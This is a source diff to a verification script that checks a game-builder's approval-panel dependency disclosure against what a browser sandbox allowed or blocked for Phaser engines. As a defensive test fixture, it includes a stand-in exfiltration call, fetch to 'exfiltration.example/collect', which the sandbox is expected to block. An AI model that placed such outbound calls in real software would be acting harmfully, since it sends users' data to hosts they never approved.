@@ -23,6 +23,7 @@
  */
 import { mkdirSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
+import { dependencyDisclosure } from '../apps/server/src/forge/dependencies.js';
 import {
   checkGameRuntime,
   isAllowedRuntimeRequest,
@@ -53,7 +54,7 @@ new Phaser.Game({ type: Phaser.AUTO, width: 480, height: 320, parent: 'game', ba
 
 const checks: string[] = [];
 /** Machine-readable record of what this gate measured, for the status document. */
-const policies: Record<string, unknown> = {};
+const policies: Record<string, Record<string, unknown>> = {};
 const measured: Record<string, unknown> = { policies, checks };
 const evidenceDir = join(
   process.cwd(),
@@ -141,6 +142,39 @@ async function main() {
     selfContained.browser ?? '',
   );
 
+  /*
+   * The same bytes, read the way the approval panel reads them (KI-74): the panel
+   * has to say "this engine is carried" about the document the browser just
+   * booted. If the disclosure and the browser disagree about whether a remote
+   * origin was needed, the reviewer is being shown a different artifact.
+   */
+  const selfContainedHtml = selfContainedGame('this.add.text(40, 200, "ok", { color: "#222" });');
+  const carried = dependencyDisclosure(selfContainedHtml);
+  policies.self_contained_disclosure = {
+    network_policy: carried.network_policy,
+    self_contained: carried.self_contained,
+    rows: carried.dependencies.map((row) => [row.status, row.reason, row.library, row.version]),
+  };
+  if (carried.network_policy !== 'vendored' || !carried.self_contained) {
+    throw new Error(
+      'the disclosure did not read the carried-engine document as needing nothing remote',
+    );
+  }
+  if (
+    carried.dependencies.length !== 1 ||
+    carried.dependencies[0]?.status !== 'bundled' ||
+    carried.dependencies[0]?.library !== 'phaser' ||
+    carried.dependencies[0]?.version !== '3.80.1'
+  ) {
+    throw new Error(
+      `the panel would not name the carried engine: ${JSON.stringify(carried.dependencies)}`,
+    );
+  }
+  pass(
+    'the approval-panel disclosure names the carried engine, and nothing else, for a self-contained game',
+    'phaser 3.80.1 bundled',
+  );
+
   const selfContainedExfil = await checkGameRuntime(
     selfContainedGame('fetch("https://exfiltration.example/collect").catch(function () {});'),
     30_000,
@@ -152,6 +186,40 @@ async function main() {
     throw new Error('a self-contained scene remote request was not recorded as blocked');
   }
   pass('a game that carries its engine is granted no network at all, so phoning home is blocked');
+
+  /*
+   * The case a passed check used to hide: a self-contained game that reaches for
+   * the network has that reach refused, and the panel must say so in the same
+   * words the browser acted on. Here the reach is a literal URL, so the static
+   * scan and the live refusal can be compared origin for origin in both
+   * directions — a disclosure that under-reported it would fail this check.
+   */
+  const exfilHtml = selfContainedGame(
+    'fetch("https://exfiltration.example/collect").catch(function () {});',
+  );
+  const exfilDisclosure = dependencyDisclosure(exfilHtml);
+  const disclosedBlocked = exfilDisclosure.dependencies
+    .filter((row) => row.status === 'blocked')
+    .map((row) => row.origin ?? '');
+  const browserBlocked = [...new Set(selfContainedExfil.blocked.map((url) => new URL(url).origin))];
+  policies.exfil_disclosure = { disclosed: disclosedBlocked, browser: browserBlocked };
+  if (disclosedBlocked.length === 0) {
+    throw new Error('the approval panel would not have shown the reach verification refused');
+  }
+  for (const origin of browserBlocked) {
+    if (!disclosedBlocked.includes(origin)) {
+      throw new Error(`verification refused ${origin}, which the disclosure does not name`);
+    }
+  }
+  for (const origin of disclosedBlocked) {
+    if (!browserBlocked.includes(origin)) {
+      throw new Error(`the disclosure names ${origin}, which verification did not refuse`);
+    }
+  }
+  pass(
+    'a refused remote reach is disclosed in the approval panel, naming the origins verification refused',
+    browserBlocked.join(' '),
+  );
 
   /*
    * A Phaser version the product does not vendor keeps its own reference and is
@@ -185,6 +253,34 @@ async function main() {
       `the runtime report did not carry the vendor gap: ${JSON.stringify(unvendoredCheck.vendor_gaps)}`,
     );
   }
+  const unvendoredDisclosure = dependencyDisclosure(unvendored);
+  policies.unvendored_disclosure = {
+    network_policy: unvendoredDisclosure.network_policy,
+    rows: unvendoredDisclosure.dependencies.map((row) => [
+      row.status,
+      row.reason,
+      row.version,
+      row.url,
+    ]),
+  };
+  const gapRow = unvendoredDisclosure.dependencies.find(
+    (row) => row.reason === 'version_outside_pin',
+  );
+  if (!gapRow) {
+    throw new Error(
+      `the panel would not name the engine version this product does not carry: ${JSON.stringify(unvendoredDisclosure.dependencies)}`,
+    );
+  }
+  if (gapRow.status !== 'fetched' || gapRow.version !== '3.55.0') {
+    throw new Error(
+      `the unsupported engine was disclosed as ${gapRow.status} ${String(gapRow.version)}`,
+    );
+  }
+  if (!unvendoredGaps.includes(gapRow.url)) {
+    throw new Error(
+      `the reference the panel would name is not the one the checker recorded: ${gapRow.url} vs ${unvendoredGaps.join(', ')}`,
+    );
+  }
   pass(
     'a Phaser version this product does not vendor keeps its reference and is reported as a gap',
     unvendoredGaps[0]?.slice(0, 72),
@@ -193,10 +289,11 @@ async function main() {
   // 1. Engine permitted but unreachable: the artifact must be refused, and the
   //    report must name the host rather than leaving "Phaser is not defined" as
   //    the only clue. This case runs with no egress at all.
-  const offline = await checkGameRuntime(
-    game('this.add.text(40, 200, "ok", { color: "#222" });', CDN_PERMITTED_AND_FAILED),
-    15_000,
+  const offlineHtml = game(
+    'this.add.text(40, 200, "ok", { color: "#222" });',
+    CDN_PERMITTED_AND_FAILED,
   );
+  const offline = await checkGameRuntime(offlineHtml, 15_000);
   console.log('engine load refused:', JSON.stringify(offline.errors));
   if (offline.ok) throw new Error('a game whose engine could not load passed runtime verification');
   if (offline.canvas) throw new Error('a game with no engine reported a canvas');
@@ -219,9 +316,51 @@ async function main() {
       `the unreachable-approved-host case reported blocked requests: ${offline.blocked.join(', ')}`,
     );
   }
+  const offlineDisclosure = dependencyDisclosure(offlineHtml);
+  const permittedOrigins = new Set(offlineDisclosure.granted_origins);
+  const disclosedFetched = new Set(
+    offlineDisclosure.dependencies
+      .filter((row) => row.status === 'fetched')
+      .map((row) => row.origin ?? ''),
+  );
+  policies.offline_disclosure = {
+    network_policy: offlineDisclosure.network_policy,
+    fetched: [...disclosedFetched],
+    granted: offlineDisclosure.granted_origins,
+  };
+  for (const line of offline.remote_failures) {
+    const origin = (line.match(/https?:\/\/[^\s)]+/) ?? [''])[0];
+    if (origin !== '' && !disclosedFetched.has(origin)) {
+      throw new Error(
+        `the browser failed a load from ${origin}, which the panel would not have shown as fetched: ${line}`,
+      );
+    }
+  }
+  // Compared by host, not exact origin: this stand-in runs on port 1 and an
+  // origin keeps the port, while the policy matches host alone. A disclosure
+  // naming `https://cdn.jsdelivr.net:1` is the same engine being permitted.
+  if (
+    ![...disclosedFetched].some((origin) => origin.includes('cdn.jsdelivr.net')) ||
+    !permittedOrigins.has('https://cdn.jsdelivr.net')
+  ) {
+    throw new Error(
+      `the engine the policy permitted was not disclosed as a fetched dependency: ${JSON.stringify([
+        ...disclosedFetched,
+      ])}`,
+    );
+  }
+
+  if (offlineDisclosure.dependencies.some((row) => row.status === 'blocked')) {
+    throw new Error(
+      'a load the policy permitted was disclosed as blocked, conflating two refusals',
+    );
+  }
   pass(
     'a game whose engine cannot load is refused, and the refusal names the approved CDN origin',
     offline.remote_failures[0]?.slice(0, 96),
+  );
+  pass(
+    'an engine the policy permits is disclosed as fetched, never as blocked, whichever way the network answered',
   );
 
   // 2. Reachable engine: the first case that needs the CDN to answer, and the
@@ -257,6 +396,27 @@ async function main() {
     }
     throw new Error(
       `valid Phaser scene did not pass runtime verification: ${good.errors.join(' | ')}`,
+    );
+  }
+  const goodDisclosure = dependencyDisclosure(
+    game('this.add.text(40, 200, "ok", { color: "#222" });'),
+  );
+  policies.cdn_dependent_disclosure = {
+    network_policy: goodDisclosure.network_policy,
+    rows: goodDisclosure.dependencies.map((row) => [
+      row.status,
+      row.reason,
+      row.origin,
+      row.version,
+    ]),
+  };
+  if (
+    goodDisclosure.dependencies.length !== 1 ||
+    goodDisclosure.dependencies[0]?.status !== 'fetched' ||
+    goodDisclosure.dependencies[0]?.origin !== 'https://cdn.jsdelivr.net'
+  ) {
+    throw new Error(
+      `a CDN-dependent game would not be disclosed as fetching its engine: ${JSON.stringify(goodDisclosure.dependencies)}`,
     );
   }
   if (good.blocked.length > 0) throw new Error('valid scene had requests blocked');
